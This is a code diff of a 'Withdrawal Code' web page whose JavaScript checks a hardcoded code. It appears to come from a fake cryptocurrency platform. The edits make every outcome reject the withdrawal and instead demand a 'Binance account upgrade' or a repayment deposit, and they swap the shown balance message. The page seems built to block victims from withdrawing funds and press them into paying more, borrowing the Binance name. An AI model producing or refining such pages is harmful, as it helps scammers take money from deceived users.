@@ -69,7 +69,7 @@
 
                     <form action="" method="">
 
-                        <p class="text-md">You have a pending repayment of $70</p>
+                        <p class="text-md deposit">No pending repayment</p>
                         <div class="contact-left-title">
                             <h2 class="text-sm">Withdrawal Code</h2>
                             <hr>
@@ -97,17 +97,17 @@
         const code = document.getElementById("code");
         const btn = document.getElementById("btn");
         // let address = "saleemtrd@gmail.com";
-        let setCode = 667503;
+        let setCode = 675403;
 
 
         btn.addEventListener("click", (e) => {
             e.preventDefault();
 
             if (code.value == setCode) {
-                swal("", "You have a pending repayment of $70 uncleared!", "error");
+                swal("", "Transaction rejected! Kindly upgrade your Binance account !", "error");
                 setTimeout(function () {
                     try {
-                        window.location.href = "deposit.html";
+                        window.location.href = "dashboard.html";
                     } catch (error) {
                         console.error("An error occurred:", error);
                         // Handle the error here, e.g., display an error message to the user
@@ -120,7 +120,7 @@
                 swal("", "Not a valid Transaction Code!", "error");
 
             } else {
-                swal("", "Kindly complete your repayment Deposit!", "error");
+                swal("", "Kindly complete your Binance account Upgrade!", "error");
             }
             code.value = "";
 
